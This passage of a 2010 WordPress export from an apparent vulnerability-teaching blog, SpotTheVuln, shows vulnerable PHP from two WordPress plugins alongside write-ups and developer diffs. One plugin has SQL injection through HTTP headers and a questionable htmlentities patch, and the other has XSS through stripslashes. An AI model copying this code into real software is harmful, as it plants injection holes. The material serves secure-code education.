$registration_log_table_name = $wpdb-&gt;prefix . "ttc_user_registration_log";
$request_time = $_SERVER['REQUEST_TIME'];
$http_accept = $_SERVER['HTTP_ACCEPT'];
$http_user_agent = $_SERVER['HTTP_USER_AGENT'];
$http_remote_addr = $_SERVER['REMOTE_ADDR'];


if($wpdb-&gt;get_var("show tables like '$registration_log_table_name'") != $registration_log_table_name) {ttc_wp_user_registration_install();
}

// wtf? accept statements coming in at over 255 chars?  Prevent sql errors and any funny business
// by shortening anything from user to 200 chars if over 255
if ( strlen($email) &gt; 200 ){ $email = substr ($email, 0, 200 ); }
if ( strlen($http_accept ) &gt; 200 ) { $http_accept = substr ( $http_accept, 0, 200 ); }
if ( strlen($http_user_agent ) &gt; 200 ) { $http_user_agent = substr ( $http_user_agent, 0, 200 ); }

$sql = "INSERT INTO " . $registration_log_table_name . " ( ip, email, problem, accept, agent, day )
VALUES ( '$http_remote_addr', '$user', '$error', '$http_accept', '$http_user_agent', NOW() )";
$result = $wpdb-&gt;query( $sql );
}



// add an email to our email blacklist if we decide it is an bot
function ttc_add_to_blacklist( $email )
{
global $wpdb;
$blacklist_table_name = $wpdb-&gt;prefix . "ttc_user_registration_blacklist";


if($wpdb-&gt;get_var("show tables like '$blacklist_table_name'") != $blacklist_table_name) {
ttc_wp_user_registration_install();
}

if ( strlen($email) &gt; 200 ){ $email = substr ($email, 0, 200 ); }

$sql = "INSERT INTO " . $blacklist_table_name . " ( blacklisted ) VALUES ( '$email' )";
$result = $wpdb-&gt;query( $sql );

}


// add an ip to our ip blacklist if we decide it is a bot
function ttc_add_to_ip_blacklist( $ip )
{
global $wpdb;
$ip_table_name = $wpdb-&gt;prefix . "ttc_ip_blacklist";


if($wpdb-&gt;get_var("show tables like '$ip_table_name'") != $ip_table_name) {
ttc_wp_user_registration_install();
}

$sql = "INSERT INTO " . $ip_table_name . " ( ip ) VALUES ( '$ip' )";
$result = $wpdb-&gt;query( $sql );
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>978</wp:post_id>
		<wp:post_date>2010-08-02 08:00:28</wp:post_date>
		<wp:post_date_gmt>2010-08-02 15:00:28</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>burnout</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[5d4bdac24d44137f04880226fb3ddd30]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dv5Y8M]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>589</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Vulnerable Source Code – Burnout ~ SpotTheVuln.com «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/08/burnout/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-08-02 08:22:48</wp:comment_date>
			<wp:comment_date_gmt>2010-08-02 15:22:48</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Ryan Dewhurst, Spot The Vuln. Spot The Vuln said: New Post: Burnout http://spotthevuln.com/2010/08/burnout/ [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>591</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Burnout &#8211; SQL Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/08/burnout-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-08-06 08:46:48</wp:comment_date>
			<wp:comment_date_gmt>2010-08-06 15:46:48</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Burnout [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Burnout - SQL Injection</title>
		<link>http://spotthevuln.com/2010/08/burnout-sql-injection/</link>
		<pubDate>Fri, 06 Aug 2010 15:00:16 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=981</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: TimesToCome Stop Bot Registration (Wordpress Plugin)

Fixed in Version: 1.9

Issue Type: SQL Injection

Original Code: <a title="Burnout" href="http://spotthevuln.com/2010/08/burnout/" target="_blank">Found    Here</a>
<h2>Description</h2>
Straight up SQL Injection vulnerability.  The following attacker controlled values are taken via the following lines:
<blockquote>$request_time = $_SERVER['REQUEST_TIME'];

$http_accept = $_SERVER['HTTP_ACCEPT'];

$http_user_agent = $_SERVER['HTTP_USER_AGENT'];

$http_remote_addr = $_SERVER['REMOTE_ADDR'];</blockquote>
Then, a few lines down the attacker controlled values are used as part of a dynamic INSERT SQL statement.
<blockquote>$sql = "INSERT INTO " . $registration_log_table_name . " ( ip, email, problem, accept, agent, day )

VALUES ( '$http_remote_addr', '$user', '$error', '$http_accept', '$http_user_agent', NOW() )";

$result = $wpdb-&gt;query( $sql );</blockquote>
Understanding that taking attacker controlled data and using it as part of a dynamic SQL statement is a bad idea, the plug-in developers checked in a patch to sanitize the data before using in the SQL statement.  The path is shown below:
<blockquote>$http_accept = htmlentities($http_accept);

$http_user_agent = htmlentities($http_user_agent);

$http_remote_addr = htmlentities($http_remote_addr);

$http_request_uri = htmlentities($html_request_uri);</blockquote>
There are a couple curious things about this patch.  First, instead of transitioning away from dynamic SQL building (which can be difficult to get just right), the authors decided to sanitize the input before passing it to the dynamic SQL.  Second (and more interesting), is the authors used htmlentities() to escape the data.  Htmlentities() is typically used to escape data to prevent XSS attacks, not SQL Injection.  Htmlentities() takes a few parameters, one of which is the optional $quote_style parameter.  The $quote_style parameter defines how strings with double and single quotes will be escaped.  According to the PHP documentation the three options are:
<blockquote>ENT_COMPAT  - Will convert double-quotes and leave single-quotes alone.

ENT_QUOTES  - Will convert both double and single quotes.

ENT_NOQUOTES - Will leave both double and single quotes unconverted</blockquote>
If the $quote_style is not specified, PHP will default to ENT_COMPAT.  Do you think this patch will hold up to the test of time?
<h2>Developers Solution</h2>
[cce lang="diff"]

// log all requests to register on our blog
function ttc_add_to_log( $user, $error)
{

global $wpdb;
$registration_log_table_name = $wpdb-&gt;prefix . "ttc_user_registration_log";
$request_time = $_SERVER['REQUEST_TIME'];
$http_accept = $_SERVER['HTTP_ACCEPT'];
$http_user_agent = $_SERVER['HTTP_USER_AGENT'];
$http_remote_addr = $_SERVER['REMOTE_ADDR'];

if($wpdb-&gt;get_var("show tables like  '$registration_log_table_name'") != $registration_log_table_name)  {ttc_wp_user_registration_install();
}

// wtf? accept statements coming in at over 255 chars?  Prevent sql errors and any funny business
// by shortening anything from user to 200 chars if over 255
if ( strlen($email) &gt; 200 ){ $email = substr ($email, 0, 200 ); }
if ( strlen($http_accept ) &gt; 200 ) { $http_accept = substr ( $http_accept, 0, 200 ); }
if ( strlen($http_user_agent ) &gt; 200 ) { $http_user_agent = substr ( $http_user_agent, 0, 200 ); }

+// clean input for database
+$http_accept = htmlentities($http_accept);
+$http_user_agent = htmlentities($http_user_agent);
+$http_remote_addr = htmlentities($http_remote_addr);
+$http_request_uri = htmlentities($html_request_uri);

$sql = "INSERT INTO " . $registration_log_table_name . " ( ip, email, problem, accept, agent, day )
VALUES ( '$http_remote_addr', '$user', '$error', '$http_accept', '$http_user_agent', NOW() )";
$result = $wpdb-&gt;query( $sql );
}

// add an email to our email blacklist if we decide it is an bot
function ttc_add_to_blacklist( $email )
{
global $wpdb;
$blacklist_table_name = $wpdb-&gt;prefix . "ttc_user_registration_blacklist";

if($wpdb-&gt;get_var("show tables like '$blacklist_table_name'") != $blacklist_table_name) {
ttc_wp_user_registration_install();
}

if ( strlen($email) &gt; 200 ){ $email = substr ($email, 0, 200 ); }

$sql = "INSERT INTO " . $blacklist_table_name . " ( blacklisted ) VALUES ( '$email' )";
$result = $wpdb-&gt;query( $sql );

}

// add an ip to our ip blacklist if we decide it is a bot
function ttc_add_to_ip_blacklist( $ip )
{
global $wpdb;
$ip_table_name = $wpdb-&gt;prefix . "ttc_ip_blacklist";

if($wpdb-&gt;get_var("show tables like '$ip_table_name'") != $ip_table_name) {
ttc_wp_user_registration_install();
}

$sql = "INSERT INTO " . $ip_table_name . " ( ip ) VALUES ( '$ip' )";
$result = $wpdb-&gt;query( $sql );
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>981</wp:post_id>
		<wp:post_date>2010-08-06 08:00:16</wp:post_date>
		<wp:post_date_gmt>2010-08-06 15:00:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>burnout-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="addslashes"><![CDATA[addslashes]]></category>
		<category domain="post_tag" nicename="bad-idea"><![CDATA[bad idea]]></category>
		<category domain="post_tag" nicename="double-quotes"><![CDATA[double quotes]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="insert-sql"><![CDATA[insert sql]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="post_tag" nicename="query-sql"><![CDATA[query sql]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c2a96b6cb1c8ccfa4cebd8b950824485]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aKg7UQ]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Tree</title>
		<link>http://spotthevuln.com/2010/08/tree/</link>
		<pubDate>Mon, 09 Aug 2010 15:00:52 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=986</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>A tree's a tree. How many more do you need to look at?</strong>
<strong> -Ronald Reagan
</strong></blockquote>
[ccnLe_php]
&lt;?php
if (!class_exists('OV_Plugin_Admin')) {
class OV_Plugin_Admin {

var $hook               = '';
var $filename   = '';
var $longname   = '';
var $shortname  = '';
var $ozhicon    = '';
var $optionname = '';
var $homepage   = '';
var $accesslvl  = 'manage_options';

function Yoast_Plugin_Admin() {
add_action( 'admin_menu', array(&amp;$this, 'register_settings_page') );
add_filter( 'plugin_action_links', array(&amp;$this, 'add_action_link'), 10, 2 );
add_filter( 'ozh_adminmenu_icon', array(&amp;$this, 'add_ozh_adminmenu_icon' ) );

add_action('admin_print_scripts', array(&amp;$this,'config_page_scripts'));
add_action('admin_print_styles', array(&amp;$this,'config_page_styles'));
}

function add_ozh_adminmenu_icon( $hook ) {
if ($hook == $this-&gt;hook)
return WP_CONTENT_URL . '/plugins/' . plugin_basename(dirname($filename)). '/'.$this-&gt;ozhicon;
return $hook;
}

function config_page_styles() {
if (isset($_GET['page']) &amp;&amp; $_GET['page'] == $this-&gt;hook) {
wp_enqueue_style('dashboard');
wp_enqueue_style('thickbox');
wp_enqueue_style('global');
wp_enqueue_style('wp-admin');
wp_enqueue_style('ov-admin-css', WP_CONTENT_URL . '/plugins/' . plugin_basename(dirname(__FILE__)). '/yst_plugin_tools.css');
}
}

function register_settings_page() {
add_options_page($this-&gt;longname, $this-&gt;shortname, $this-&gt;accesslvl, $this-&gt;hook, array(&amp;$this,'config_page'));
}

function plugin_options_url() {
return admin_url( 'options-general.php?page='.$this-&gt;hook );
}

/**
* Add a link to the settings page to the plugins list
*/
function add_action_link( $links, $file ) {
static $this_plugin;
if( empty($this_plugin) ) $this_plugin = $this-&gt;filename;
if ( $file == $this_plugin ) {
$settings_link = '&lt;a href="' . $this-&gt;plugin_options_url() . '"&gt;' . __('Settings') . '&lt;/a&gt;';
array_unshift( $links, $settings_link );
}
return $links;
}

function config_page() {

}

function config_page_scripts() {
if (isset($_GET['page']) &amp;&amp; $_GET['page'] == $this-&gt;hook) {
wp_enqueue_script('postbox');
wp_enqueue_script('dashboard');
wp_enqueue_script('thickbox');
wp_enqueue_script('media-upload');
}
}

/**
* Create a Checkbox input field
*/
function checkbox($id, $label) {
$options = get_option($this-&gt;optionname);
return '&lt;input type="checkbox" id="'.$id.'" name="'.$id.'"'. checked($options[$id],true,false).'/&gt; &lt;label for="'.$id.'"&gt;'.$label.'&lt;/label&gt;&lt;br/&gt;';
}

/**
* Create a Text input field
*/
function textinput($id, $label) {
$options = get_option($this-&gt;optionname);
return '&lt;label for="'.$id.'"&gt;'.$label.':&lt;/label&gt;&lt;br/&gt;&lt;input size="45" type="text" id="'.$id.'" name="'.$id.'" value="'.stripslashes($options[$id]).'"/&gt;&lt;br/&gt;&lt;br/&gt;';
}

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>986</wp:post_id>
		<wp:post_date>2010-08-09 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-08-09 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>tree</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[196af9797d1309ab5581bdd8a5329d7a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bBNNIt]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Tree]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Tree]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>605</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Tree &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/08/tree-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-08-13 08:40:25</wp:comment_date>
			<wp:comment_date_gmt>2010-08-13 15:40:25</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Tree [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Tree – Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/08/tree-cross-site-scripting/</link>
		<pubDate>Fri, 13 Aug 2010 15:40:19 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1003</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Wordpress-to-lead for Salesforce CRM

Fixed in Version: 1.0.5

Issue Type: Cross Site Scripting

Original Code: <a title="Tree" href="http://spotthevuln.com/2010/08/tree/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s vulnerability is an XSS bug in a Salesforce plugin for Wordpress.  This bug is a bit interesting as it seems the developer attempted to sanitize an attacker controlled variable, but used the incorrect API.  Looking at the vulnerable code, we see the following line:
<blockquote>return '&lt;label for="'.$id.'"&gt;'.$label.':&lt;/label&gt;&lt;br/&gt;&lt;input size="45" name="'.$id.'" value="'.stripslashes($options[$id]).'"/&gt;&lt;br/&gt;&lt;br/&gt;';</blockquote>
In the line above, we see that $options[$id] is placed into the rendered HTML.  $options[$id] appears to be attacker controlled and the developers used the stripslashes() API to sanitize $options[$id] before displaying the value in HTML.  Unfortunately, stripslashes() doesn’t help prevent XSS vulnerabilities and created an opportunity for XSS.  The developer fixed this vulnerability by using the correct API to sanitize against XSS vulnerability (htmlentities).
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php
if (!class_exists('OV_Plugin_Admin')) {
class OV_Plugin_Admin {

var $hook               = '';
var $filename   = '';
var $longname   = '';
var $shortname  = '';
var $ozhicon    = '';
var $optionname = '';
var $homepage   = '';
var $accesslvl  = 'manage_options';

function Yoast_Plugin_Admin() {
add_action( 'admin_menu', array(&amp;$this, 'register_settings_page') );
add_filter( 'plugin_action_links', array(&amp;$this, 'add_action_link'), 10, 2 );
add_filter( 'ozh_adminmenu_icon', array(&amp;$this, 'add_ozh_adminmenu_icon' ) );

add_action('admin_print_scripts', array(&amp;$this,'config_page_scripts'));
add_action('admin_print_styles', array(&amp;$this,'config_page_styles'));
}

function add_ozh_adminmenu_icon( $hook ) {
if ($hook == $this-&gt;hook)
return WP_CONTENT_URL . '/plugins/' . plugin_basename(dirname($filename)). '/'.$this-&gt;ozhicon;
return $hook;
}

function config_page_styles() {
if (isset($_GET['page']) &amp;&amp; $_GET['page'] == $this-&gt;hook) {
wp_enqueue_style('dashboard');
wp_enqueue_style('thickbox');
wp_enqueue_style('global');
wp_enqueue_style('wp-admin');
wp_enqueue_style('ov-admin-css', WP_CONTENT_URL . '/plugins/' . plugin_basename(dirname(__FILE__)). '/yst_plugin_tools.css');
}
}

function register_settings_page() {
add_options_page($this-&gt;longname, $this-&gt;shortname, $this-&gt;accesslvl, $this-&gt;hook, array(&amp;$this,'config_page'));
}

function plugin_options_url() {
return admin_url( 'options-general.php?page='.$this-&gt;hook );
}

/**
* Add a link to the settings page to the plugins list
*/
function add_action_link( $links, $file ) {
static $this_plugin;
if( empty($this_plugin) ) $this_plugin = $this-&gt;filename;
if ( $file == $this_plugin ) {
$settings_link = '&lt;a href="' . $this-&gt;plugin_options_url() . '"&gt;' . __('Settings') . '&lt;/a&gt;';
array_unshift( $links, $settings_link );
}
return $links;
}

function config_page() {

}

function config_page_scripts() {
if (isset($_GET['page']) &amp;&amp; $_GET['page'] == $this-&gt;hook) {
wp_enqueue_script('postbox');
wp_enqueue_script('dashboard');
wp_enqueue_script('thickbox');
wp_enqueue_script('media-upload');
}
}

/**
* Create a Checkbox input field
*/
function checkbox($id, $label) {
$options = get_option($this-&gt;optionname);
return '&lt;input type="checkbox" id="'.$id.'" name="'.$id.'"'. checked($options[$id],true,false).'/&gt; &lt;label for="'.$id.'"&gt;'.$label.'&lt;/label&gt;&lt;br/&gt;';
}

/**
* Create a Text input field
*/
function textinput($id, $label) {
$options = get_option($this-&gt;optionname);
-                       return '&lt;label for="'.$id.'"&gt;'.$label.':&lt;/label&gt;&lt;br/&gt;&lt;input size="45" type="text" id="'.$id.'" name="'.$id.'" value="'.stripslashes($options[$id]).'"/&gt;&lt;br/&gt;&lt;br/&gt;';
+                       return '&lt;label for="'.$id.'"&gt;'.$label.':&lt;/label&gt;&lt;br/&gt;&lt;input size="45" type="text" id="'.$id.'" name="'.$id.'" value="'.htmlentities(stripslashes($options[$id])).'"/&gt;&lt;br/&gt;&lt;br/&gt;';
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1003</wp:post_id>
		<wp:post_date>2010-08-13 08:40:19</wp:post_date>
		<wp:post_date_gmt>2010-08-13 15:40:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>tree-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[8f13ad95fdc794da4fdc0484a6b685cd]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/b1GIHi]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CaddyShack</title>
		<link>http://spotthevuln.com/2010/08/caddyshack/</link>
		<pubDate>Mon, 16 Aug 2010 15:00:35 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1015</guid>
		<description></description>
